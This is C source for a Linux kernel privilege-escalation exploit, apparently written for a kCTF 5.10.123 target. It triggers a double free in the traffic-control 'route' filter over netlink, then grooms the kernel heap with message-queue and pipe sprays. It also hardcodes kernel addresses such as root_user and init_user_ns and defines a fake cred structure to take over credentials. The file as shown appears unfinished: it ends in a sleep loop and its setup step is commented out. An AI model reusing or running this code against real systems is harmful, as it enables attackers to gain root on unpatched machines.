#define _GNU_SOURCE

#include <arpa/inet.h>
#include <assert.h>
#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/epoll.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <sys/resource.h>
#include <linux/tc_ematch/tc_em_meta.h>
#include <linux/capability.h>
#include <linux/futex.h>
#include <linux/genetlink.h>
#include <linux/if_addr.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/in6.h>
#include <linux/ip.h>
#include <linux/neighbour.h>
#include <linux/net.h>
#include <linux/netlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <linux/tcp.h>
#include <linux/veth.h>
#include <linux/kcmp.h>
#include <x86intrin.h>
#include <fcntl.h>
#include <poll.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <err.h>
#include <pthread.h>
#include <keyutils.h>
#include "libexp.c"
#define PAGE_SIZE 0x1000
#define RLIMIT_FILE 0x3000
#define MAX_PIPE_NUM 0x400
#define MAX_PIPE_SPRAY 0x300
#define PIPE_PAGE_NUM 0x1200
#define MAX_PROCESS_NUM 0x400

#define MSG

#define MAX_KEY_SPRAY 0x80


int pipe_priv[2][2];
int pipe_exp[2];
int pipes[MAX_PIPE_NUM][2];
int pipe_pages[0x2000][2];
key_serial_t keys[MAX_KEY_SPRAY];

int cpu_cores = 0;
int sockfd = -1;
//void *global_data;
void *global_buffer;
unsigned long heap = 0;
unsigned long kaslr = 0;

// for kctf kernel 5.10.123
unsigned long root_user = 0xffffffff82657f60;
unsigned long init_user_ns = 0xffffffff82657fe0;
unsigned long init_groups = 0xffffffff826595a8;
unsigned long pipe_ops = 0xffffffff8222bd00;

struct cred {
  int32_t usage;
  int32_t subscribers;
  void *put;
  unsigned magic;
  char uid[77];
  void *keyring[4];
  unsigned long security;
  unsigned long user;
  unsigned long user_ns;
  unsigned long group;
  int rcu;
};

void DumpHex(const void *data, size_t size) {
#ifdef DEBUG
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
#endif
}

void msleep(unsigned int time) {
  usleep(time*1000);
}

void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
  usleep(1000);
}


#define NLMSG_TAIL(nmsg)                                                       \
  ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

int addattr(char *attr, int type, void *data, int len) {
  struct rtattr *rta = (struct rtattr*)attr;

  rta->rta_type = type;
  rta->rta_len = RTA_LENGTH(len);
  if (len) {
    memcpy(RTA_DATA(attr), data, len);
  }

  return RTA_LENGTH(len);
}

int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,
              int alen) {
  int len = RTA_LENGTH(alen);
  struct rtattr *rta;

  if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
    fprintf(stderr, "addattr_l ERROR: message exceeded bound of %d\n", maxlen);
    return -1;
  }
  rta = NLMSG_TAIL(n);
  rta->rta_type = type;
  rta->rta_len = len;
  if (alen)
    memcpy(RTA_DATA(rta), data, alen);
  n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
  return 0;
}

struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type) {
  struct rtattr *nest = NLMSG_TAIL(n);

  addattr_l(n, maxlen, type, NULL, 0);
  return nest;
}

int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest) {
  nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
  return n->nlmsg_len;
}

int add_qdisc(int fd) {
  char *start = malloc(0x1000);
  memset(start, 0, 0x1000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new qdisc
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
  msg->nlmsg_type = RTM_NEWQDISC;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
  // set local
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_parent = TC_H_ROOT;
  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);

  addattr_l(msg, 0x1000, TCA_KIND, "sfq", 4);

  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };
  return sendmsg(fd, &msgh, 0);
}

int add_tc_(int fd, u_int32_t from, u_int32_t to, u_int32_t handle, u_int16_t flags) {
  char *start = malloc(0x2000);
  memset(start, 0, 0x2000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | flags;
  msg->nlmsg_type = RTM_NEWTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;

  addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_l(msg, 0x1000, TCA_ROUTE4_FROM, &from, 4);
  addattr_l(msg, 0x1000, TCA_ROUTE4_TO, &to, 4);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(fd, &msgh, 0);

  free(start);
  return 1;
}

void add_tc(int sockfd, uint32_t handle, uint16_t flag) {
  add_tc_(sockfd, 0, handle, (handle<<8) + handle, flag);
}



char global_data[0x2000];
void hijack() {

  int cnt = 0;
  //pin_on_cpu(0);


  // getchar();
  sockfd = socket(PF_NETLINK, SOCK_RAW, 0);
  assert(sockfd != -1);
  add_qdisc(sockfd);

  // add this filter to avoid allocating noise in the middle
  add_tc_(sockfd, 0, 0x7f, 0x7f7f, NLM_F_EXCL | NLM_F_CREATE);

  // first part
  char data[2] = {};

  int msg_spray_size = 144;

  struct msg_spray_t *msg_spray_1 = msg_spray(NULL, (msg_spray_size-0x30) ,0x200-2);
  printf("first part spray msg done\n");


  puts("\n\n\nadd obj");  
  add_tc_(sockfd, 0, 0, 0, NLM_F_EXCL | NLM_F_CREATE);
  puts("add obj done\n\n\n");
  // allocate one in the page of vuln obj
  fcntl(pipe_exp[1], F_SETPIPE_SZ, 0x1000*4);
  write(pipe_exp[1],"BBBBBBBBBBBBBBBB",0x10);
  struct msg_spray_t *msg_spray_2 = msg_spray(NULL, (msg_spray_size-0x30) ,0x200);

  puts("second part spray msg done");
 
  
  msg_spray_clean(msg_spray_1);

  // DF
  add_tc_(sockfd, 0x12, 0x13, 0, NLM_F_CREATE);
  msleep(100);
  add_tc_(sockfd, 0x11, 0x13, 0, NLM_F_CREATE);
  msleep(100);
  printf("double free done\n");

   msg_spray_clean(msg_spray_2);

  msleep(100);

  //getchar();

  puts("free all msg done");
 
  char fake_ops[0x1000];
  memset(fake_ops,0x41,0x1000);
  unsigned long take_page_back_buffer[0x1000/8];
  for (int i=0;i<0x1000/8;i++) {
  	take_page_back_buffer[i] = (unsigned long)fake_ops;
  }
  //printf("take_page_back_buffer: %p\n",take_page_back_buffer);
  //memset(take_page_back_buffer,0x41,0x1000);

  printf("obj spray\n");
  char payload[0x1000];memset(payload,0x41,0x1000);
  struct msg_spray_t *msg_spray_3 = msg_spray(payload, (128-0x30) ,0x600);	// must be 128 so it won't crash

  //int num;
  //for (int i=0; i<0x400; i++) {
  //       num = write(pipe_pages[i][1], take_page_back_buffer, 0x1000);
  //	 printf("writing to page %d\t%d\n", i,num);
 // }
 // printf("page spray done\n");

  puts("done");

  usleep(3000000);
  read(pipe_exp[0], take_page_back_buffer, 0x100);
  while(1) {
  
  	sleep(999999999999);
  }

}

int main() {
  for (int i=0; i < 0x2000; i++) {
    if (pipe(pipe_pages[i]) < 0) {
      err(1, "pipe page");
    }
    fcntl(pipe_pages[i][1], F_SETPIPE_SZ, 0x1000);
  }
  puts("pipe pages init done");
  if (pipe(pipe_exp) < 0) {
      err(1, "pipe exp");
    }

   struct msg_spray_t *msg_spray_warmup = msg_spray(NULL, (144-0x30) ,0x600);
  msg_spray_clean(msg_spray_warmup);
  puts("warmup done");
  msleep(300);
     
	//pre_exploit();
  hijack();
}
